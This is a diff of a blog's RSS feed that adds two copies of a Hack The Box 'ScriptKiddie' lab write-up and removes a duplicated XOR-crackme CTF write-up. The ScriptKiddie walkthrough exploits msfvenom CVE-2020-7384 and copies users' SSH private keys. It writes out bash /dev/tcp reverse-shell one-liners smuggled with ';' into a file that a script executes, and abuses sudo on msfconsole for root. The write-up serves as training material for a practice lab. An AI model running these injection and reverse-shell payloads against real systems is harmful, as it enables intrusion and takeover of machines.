@@ -1,14 +1,160 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Htb-writeups on The Wolf Den</title>
+    <title>HTB-writeups on The Wolf Den</title>
     <link>http://nightwolf56.github.io/htb-writeups/</link>
-    <description>Recent content in Htb-writeups on The Wolf Den</description>
+    <description>Recent content in HTB-writeups on The Wolf Den</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sat, 22 May 2021 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Wed, 16 Jun 2021 00:00:00 -0600</lastBuildDate>
     
         <atom:link href="http://nightwolf56.github.io/htb-writeups/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>HTB ScriptKiddie</title>
+      <link>http://nightwolf56.github.io/htb-writeups/scriptkiddie-writeup/</link>
+      <pubDate>Wed, 16 Jun 2021 00:00:00 -0600</pubDate>
+      
+      <guid>http://nightwolf56.github.io/htb-writeups/scriptkiddie-writeup/</guid>
+      <description>&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-logo.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;In ScriptKiddie, we compromise a server run by a pair of script kiddies with an outdated version of msfvenom and chain several misconfigurations to achieve root access.&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.91 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2021-02-07 15:33 UTC
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.226
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.19s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;3072&lt;/span&gt; 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+5000/tcp open  http    Werkzeug httpd 0.16.1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Python 3.8.5&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_http-title: k1d&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; h4ck3r t00l5
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 30.26 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;NMAP  shows there is an SSH server which will be quiet useful late. For now since there are no know credentials or see an obvious vulnerability take a look at the web server on port 5000.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-h4ck3rt00l5.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;The site is a page single page of various &lt;em&gt;h4ck3r t00l5&lt;/em&gt;, NMAP, an msfvenom payload generator, and a search bar for Exploit DB. There doesn&amp;rsquo;t seem to be a whole lot more on the web server. Payloads can be generated and have an upload feature but outside of that and viewing the output from Exploit DB and NMAP there isn&amp;rsquo;t much on the site.&lt;/p&gt;
+&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+&lt;p&gt;It&amp;rsquo;s worth fuzzing by trying various special characters in the input fields for the nmap and exploit-db, and msfvenom input fields to see if there is a way to break it and achieve code execution. This dosen&amp;rsquo;t yield much and it seems there is some level of filtering in place.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-stophackingme.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;However, there is another place to provide user input. The msfvenom upload. . Playing around with the parameters shows that the windows payload expects an EXE, Android expects an APK, and  Linux would like an ELF. However it doens&amp;rsquo;t seem to work properly, returns that &amp;ldquo;Something went wrong&amp;rdquo;. Not super descriptive for trouble shooting.&lt;/p&gt;
+&lt;p&gt;It turns out that  &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2020-7384&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;CVE-2020-7384&lt;/a&gt;
+ is a vulnerability in msfvenom that allows for code injection using APK template files.  We find a link on the nvd.nist.gove page that links to a &lt;a href=&#34;https://packetstormsecurity.com/files/161200/Metasploit-Framework-6.0.11-Command-Injection.html&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Metasploit module&lt;/a&gt;
+.&lt;/p&gt;
+&lt;p&gt;A module has also been included in msfconsole. Finding and configuring it is fairly trivial.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-msfvenomapkrcesetup.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;A payload is generated and then stored. Start a netcat listener, &lt;code&gt;nc -lnvp 4444&lt;/code&gt;, and  upload the malicious APK to the server.&lt;/p&gt;
+&lt;p&gt;After a few minutes of loading, the listner gets a callback.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-callback.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;The call back is as the user &lt;code&gt;kid&lt;/code&gt; and they have a private SSH key in &lt;code&gt;/home/kid/.ssh/id_rsa&lt;/code&gt;That can be copied and pasted an attacker&amp;rsquo;s machine, permissions changed, &lt;code&gt;chmod 600 kid-id_rsa&lt;/code&gt; and then used to SSH right in and collect user.txt&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;kid&lt;/code&gt; dosen&amp;rsquo;t seem to be in interesting groups nor do we have credentials to try and abuse. Checking through the code of the webapp to see if there is anything that can be used.&lt;/p&gt;
+&lt;p&gt;IPs from requests that that are marked as containing special characters are entered into a &lt;code&gt;hackers&lt;/code&gt; file that also appears to be empty. Though &lt;code&gt;kid&lt;/code&gt; dose have write permissions. Expanding the search beyond the &lt;code&gt;kid&lt;/code&gt;&amp;rsquo;s home directory and finds another user, &lt;code&gt;pwn&lt;/code&gt; We check out his directory and find a nicely named script called &lt;code&gt;scanlosers.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-scanlosers.png&#34;
+        alt=&#34;SCANLOSERS.PNG&#34;/&gt;&lt;/p&gt;
+&lt;p&gt;It collects input from the &lt;code&gt;hackers&lt;/code&gt; file found earlier. One option would be to try to provide it with input that would launch a reverse shell. An attacker can stand up a netcat listener, &lt;code&gt;nc -lnvp 1234&lt;/code&gt;, and start trying to get a working payload.&lt;/p&gt;
+&lt;p&gt;The following is a good starting point. &lt;code&gt;echo &amp;quot;bash -c &#39;bash -i&amp;gt;&amp;amp;/dev/tcp/10.10.14.20/1234 0&amp;gt;&amp;amp;1&#39;&amp;quot; &amp;gt; /home/kid/hackers&lt;/code&gt; and unfortunately, nothing comes back.  A space and a semi colon can be added to make sure we escape a current command. &lt;code&gt;echo &amp;quot;  ;bash -c &#39;bash -i&amp;gt;&amp;amp;/dev/tcp/10.10.14.20/1234 0&amp;gt;&amp;amp;1&#39;&amp;quot; &amp;gt; /home/kid/hackers&lt;/code&gt; The netcat listener get&amp;rsquo;s a connection!&lt;/p&gt;
+&lt;p&gt;Which promptly dies. &amp;ldquo;ambicous redirect&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-ambiguousredirect.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;It&amp;rsquo;s likely that whatever is after the reverse shell in  &lt;code&gt;scanlosers.sh&lt;/code&gt; script is doing odd things to it. A solution is to comment it out. &lt;code&gt;echo &amp;quot;  ;bash -c &#39;bash -i&amp;gt;&amp;amp;/dev/tcp/10.10.14.20/1234 0&amp;gt;&amp;amp;1&#39; # &amp;quot; &amp;gt; /home/kid/hackers&lt;/code&gt; Bingo. This time the call back is stable. &lt;code&gt;pwn&lt;/code&gt; is also kind enough to have a handy SSH key.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-pwnsshkey.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h2 id=&#34;root&#34;&gt;Root&lt;/h2&gt;
+&lt;p&gt;Once again, &lt;code&gt;pwn&lt;/code&gt; dosen&amp;rsquo;t any interesting groups nor are there credentials to try &lt;em&gt;but&lt;/em&gt; &lt;code&gt;sudo -l&lt;/code&gt; reveals they can run a command with root privileges without authentication.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-pwnsudopermissions.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Msfconsolse can be started with root privileges. Not exactly the best sudo configuration. Launching the msfconsole we have full root privileges and nothing says we need to attack a remote target. Instead the commands can be executed directly on our current system.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-root.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h2 id=&#34;wrap-up&#34;&gt;Wrap Up&lt;/h2&gt;
+&lt;p&gt;All in all, this was a pretty easy box and probably one of the shortest writeups I have written. That said, I really enjoyed it. In part it was nice to have a break from boxes where I had to think a lot harder and I also really enjoyed the theme of exploiting the infrastructure of a couple of Script Kiddies. Thank you very much &lt;a href=&#34;https://app.hackthebox.eu/users/4935&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;0xdf&lt;/a&gt;
+ all the hard work you put into making this machine.&lt;/p&gt;
+&lt;p&gt;Side note: Some of you maybe wondering how &lt;code&gt;scanlosers.sh&lt;/code&gt; was running. It seems like a cronjob but if you checked cron while enumerating, you won&amp;rsquo;t find it. It&amp;rsquo;s instead using something called &lt;code&gt;incron&lt;/code&gt;which instead of being time based, is based on file system events. It runs when it detects a write to &lt;code&gt;hackers&lt;/code&gt;, &lt;code&gt;scanlosers.sh&lt;/code&gt;. It&amp;rsquo;s a pretty neat trick that I should find a use for someday.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>HTB ScriptKiddie</title>
+      <link>http://nightwolf56.github.io/posts/scriptkiddie-writeup/</link>
+      <pubDate>Wed, 16 Jun 2021 00:00:00 -0600</pubDate>
+      
+      <guid>http://nightwolf56.github.io/posts/scriptkiddie-writeup/</guid>
+      <description>&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-logo.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;In ScriptKiddie, we compromise a server run by a pair of script kiddies with an outdated version of msfvenom and chain several misconfigurations to achieve root access.&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.91 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2021-02-07 15:33 UTC
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.226
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.19s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;3072&lt;/span&gt; 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+5000/tcp open  http    Werkzeug httpd 0.16.1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Python 3.8.5&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_http-title: k1d&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; h4ck3r t00l5
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 30.26 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;NMAP  shows there is an SSH server which will be quiet useful late. For now since there are no know credentials or see an obvious vulnerability take a look at the web server on port 5000.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-h4ck3rt00l5.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;The site is a page single page of various &lt;em&gt;h4ck3r t00l5&lt;/em&gt;, NMAP, an msfvenom payload generator, and a search bar for Exploit DB. There doesn&amp;rsquo;t seem to be a whole lot more on the web server. Payloads can be generated and have an upload feature but outside of that and viewing the output from Exploit DB and NMAP there isn&amp;rsquo;t much on the site.&lt;/p&gt;
+&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+&lt;p&gt;It&amp;rsquo;s worth fuzzing by trying various special characters in the input fields for the nmap and exploit-db, and msfvenom input fields to see if there is a way to break it and achieve code execution. This dosen&amp;rsquo;t yield much and it seems there is some level of filtering in place.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-stophackingme.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;However, there is another place to provide user input. The msfvenom upload. . Playing around with the parameters shows that the windows payload expects an EXE, Android expects an APK, and  Linux would like an ELF. However it doens&amp;rsquo;t seem to work properly, returns that &amp;ldquo;Something went wrong&amp;rdquo;. Not super descriptive for trouble shooting.&lt;/p&gt;
+&lt;p&gt;It turns out that  &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2020-7384&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;CVE-2020-7384&lt;/a&gt;
+ is a vulnerability in msfvenom that allows for code injection using APK template files.  We find a link on the nvd.nist.gove page that links to a &lt;a href=&#34;https://packetstormsecurity.com/files/161200/Metasploit-Framework-6.0.11-Command-Injection.html&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Metasploit module&lt;/a&gt;
+.&lt;/p&gt;
+&lt;p&gt;A module has also been included in msfconsole. Finding and configuring it is fairly trivial.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-msfvenomapkrcesetup.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;A payload is generated and then stored. Start a netcat listener, &lt;code&gt;nc -lnvp 4444&lt;/code&gt;, and  upload the malicious APK to the server.&lt;/p&gt;
+&lt;p&gt;After a few minutes of loading, the listner gets a callback.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-callback.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;The call back is as the user &lt;code&gt;kid&lt;/code&gt; and they have a private SSH key in &lt;code&gt;/home/kid/.ssh/id_rsa&lt;/code&gt;That can be copied and pasted an attacker&amp;rsquo;s machine, permissions changed, &lt;code&gt;chmod 600 kid-id_rsa&lt;/code&gt; and then used to SSH right in and collect user.txt&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;kid&lt;/code&gt; dosen&amp;rsquo;t seem to be in interesting groups nor do we have credentials to try and abuse. Checking through the code of the webapp to see if there is anything that can be used.&lt;/p&gt;
+&lt;p&gt;IPs from requests that that are marked as containing special characters are entered into a &lt;code&gt;hackers&lt;/code&gt; file that also appears to be empty. Though &lt;code&gt;kid&lt;/code&gt; dose have write permissions. Expanding the search beyond the &lt;code&gt;kid&lt;/code&gt;&amp;rsquo;s home directory and finds another user, &lt;code&gt;pwn&lt;/code&gt; We check out his directory and find a nicely named script called &lt;code&gt;scanlosers.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-scanlosers.png&#34;
+        alt=&#34;SCANLOSERS.PNG&#34;/&gt;&lt;/p&gt;
+&lt;p&gt;It collects input from the &lt;code&gt;hackers&lt;/code&gt; file found earlier. One option would be to try to provide it with input that would launch a reverse shell. An attacker can stand up a netcat listener, &lt;code&gt;nc -lnvp 1234&lt;/code&gt;, and start trying to get a working payload.&lt;/p&gt;
+&lt;p&gt;The following is a good starting point. &lt;code&gt;echo &amp;quot;bash -c &#39;bash -i&amp;gt;&amp;amp;/dev/tcp/10.10.14.20/1234 0&amp;gt;&amp;amp;1&#39;&amp;quot; &amp;gt; /home/kid/hackers&lt;/code&gt; and unfortunately, nothing comes back.  A space and a semi colon can be added to make sure we escape a current command. &lt;code&gt;echo &amp;quot;  ;bash -c &#39;bash -i&amp;gt;&amp;amp;/dev/tcp/10.10.14.20/1234 0&amp;gt;&amp;amp;1&#39;&amp;quot; &amp;gt; /home/kid/hackers&lt;/code&gt; The netcat listener get&amp;rsquo;s a connection!&lt;/p&gt;
+&lt;p&gt;Which promptly dies. &amp;ldquo;ambicous redirect&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-ambiguousredirect.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;It&amp;rsquo;s likely that whatever is after the reverse shell in  &lt;code&gt;scanlosers.sh&lt;/code&gt; script is doing odd things to it. A solution is to comment it out. &lt;code&gt;echo &amp;quot;  ;bash -c &#39;bash -i&amp;gt;&amp;amp;/dev/tcp/10.10.14.20/1234 0&amp;gt;&amp;amp;1&#39; # &amp;quot; &amp;gt; /home/kid/hackers&lt;/code&gt; Bingo. This time the call back is stable. &lt;code&gt;pwn&lt;/code&gt; is also kind enough to have a handy SSH key.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-pwnsshkey.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h2 id=&#34;root&#34;&gt;Root&lt;/h2&gt;
+&lt;p&gt;Once again, &lt;code&gt;pwn&lt;/code&gt; dosen&amp;rsquo;t any interesting groups nor are there credentials to try &lt;em&gt;but&lt;/em&gt; &lt;code&gt;sudo -l&lt;/code&gt; reveals they can run a command with root privileges without authentication.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-pwnsudopermissions.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Msfconsolse can be started with root privileges. Not exactly the best sudo configuration. Launching the msfconsole we have full root privileges and nothing says we need to attack a remote target. Instead the commands can be executed directly on our current system.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/scriptkiddie-root.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h2 id=&#34;wrap-up&#34;&gt;Wrap Up&lt;/h2&gt;
+&lt;p&gt;All in all, this was a pretty easy box and probably one of the shortest writeups I have written. That said, I really enjoyed it. In part it was nice to have a break from boxes where I had to think a lot harder and I also really enjoyed the theme of exploiting the infrastructure of a couple of Script Kiddies. Thank you very much &lt;a href=&#34;https://app.hackthebox.eu/users/4935&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;0xdf&lt;/a&gt;
+ all the hard work you put into making this machine.&lt;/p&gt;
+&lt;p&gt;Side note: Some of you maybe wondering how &lt;code&gt;scanlosers.sh&lt;/code&gt; was running. It seems like a cronjob but if you checked cron while enumerating, you won&amp;rsquo;t find it. It&amp;rsquo;s instead using something called &lt;code&gt;incron&lt;/code&gt;which instead of being time based, is based on file system events. It runs when it detects a write to &lt;code&gt;hackers&lt;/code&gt;, &lt;code&gt;scanlosers.sh&lt;/code&gt;. It&amp;rsquo;s a pretty neat trick that I should find a use for someday.&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>HTB Delivery</title>
@@ -707,76 +853,6 @@ else{
     Denied
 }
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The value user input is being compared to can be determined by converting the values of each variable to ASCII. Combine these values and we have retrieved the flag&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Cyber Apocalypse 2021: Authenticator</title>
-      <link>http://nightwolf56.github.io/ctf-writeups/ca-authenticator/</link>
-      <pubDate>Sun, 25 Apr 2021 00:00:00 +0000</pubDate>
-      
-      <guid>http://nightwolf56.github.io/ctf-writeups/ca-authenticator/</guid>
-      <description>&lt;p&gt;Authenticator is a ELF 64 bit executable. It is dynamically linked and is not stripped for debug symbols&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ file authenticator
-authenticator: ELF 64-bit LSB shared object, x86-64, version &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SYSV&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; GNU/Linux 3.2.0, BuildID&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sha1&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;66286657ca5a06147189b419238b2971b11c72db, not stripped
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Strings shows a lot of standard stuff and a few things that are likely directly related to this challenge. There are a couple of what seem to be dialog lines, mention of a flag and a rather strange sequence of, &lt;code&gt;}a:Vh|}a:g}8j=}89gV&amp;lt;p&amp;lt;}:dV8&amp;lt;Vg9}V&amp;lt;9V&amp;lt;:j|{:&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;Since the file is not stripped, main is listed in Ghidra&amp;rsquo;s symbol tree under functions.&lt;/p&gt;
-&lt;p&gt;The program prompts for input of a username and a pin. If they are both correct, the then a success message is output. The username is show to be &lt;code&gt;11337&lt;/code&gt; but the pin provided by the user is passed to another function and it&amp;rsquo;s return value is evaluated.&lt;/p&gt;
-&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ca-authenticator-main-light.png&#34;
-        alt/&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;get username
-if username == 11337 {
-    get pin
-    chekpin(pin)
-    if pin == correct value {
-        Suceess
-    }
-    else {
-        Access denied
-    }
-}
-else {
-    Access denied
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the check pin function, the odd string we noticed earlier is XOR&amp;rsquo;d with the key of &lt;code&gt;9U&lt;/code&gt; and the value is compared with the pin provided by the user.&lt;/p&gt;
-&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ca-authenticator-checkpin.png&#34;
-        alt/&gt;&lt;/p&gt;
-&lt;p&gt;XOR &lt;code&gt;}a:Vh|}a:g}8j=}89gV&amp;lt;p&amp;lt;}:dV8&amp;lt;Vg9}V&amp;lt;9V&amp;lt;:j|{:&lt;/code&gt; with &lt;code&gt;9U&lt;/code&gt; and the result is the value of the flag once it is wrapped in the flag format CHTB{}.&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Cyber Apocalypse 2021: Authenticator</title>
-      <link>http://nightwolf56.github.io/posts/ca-authenticator/</link>
-      <pubDate>Sun, 25 Apr 2021 00:00:00 +0000</pubDate>
-      
-      <guid>http://nightwolf56.github.io/posts/ca-authenticator/</guid>
-      <description>&lt;p&gt;Authenticator is a ELF 64 bit executable. It is dynamically linked and is not stripped for debug symbols&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ file authenticator
-authenticator: ELF 64-bit LSB shared object, x86-64, version &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SYSV&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; GNU/Linux 3.2.0, BuildID&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sha1&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;66286657ca5a06147189b419238b2971b11c72db, not stripped
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Strings shows a lot of standard stuff and a few things that are likely directly related to this challenge. There are a couple of what seem to be dialog lines, mention of a flag and a rather strange sequence of, &lt;code&gt;}a:Vh|}a:g}8j=}89gV&amp;lt;p&amp;lt;}:dV8&amp;lt;Vg9}V&amp;lt;9V&amp;lt;:j|{:&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;Since the file is not stripped, main is listed in Ghidra&amp;rsquo;s symbol tree under functions.&lt;/p&gt;
-&lt;p&gt;The program prompts for input of a username and a pin. If they are both correct, the then a success message is output. The username is show to be &lt;code&gt;11337&lt;/code&gt; but the pin provided by the user is passed to another function and it&amp;rsquo;s return value is evaluated.&lt;/p&gt;
-&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ca-authenticator-main-light.png&#34;
-        alt/&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;get username
-if username == 11337 {
-    get pin
-    chekpin(pin)
-    if pin == correct value {
-        Suceess
-    }
-    else {
-        Access denied
-    }
-}
